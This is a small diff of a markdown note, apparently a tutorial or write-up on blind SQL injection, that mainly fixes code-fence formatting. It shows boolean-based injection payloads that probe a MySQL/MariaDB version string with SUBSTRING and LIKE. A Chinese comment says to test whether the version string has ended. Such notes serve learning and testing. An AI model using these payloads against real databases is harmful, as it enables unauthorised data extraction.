@@ -109,12 +109,11 @@ SELECT * FROM users WHERE id=0 OR (SELECT SUBSTRING((SELECT @@version),1,2) = '1
 ```
 
 ## Done
-```
 ```sql
 # 200
 1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26%') AND 1='1
 ```
-```
+
 最後再測試版號是否已經結束
 
 ```sql
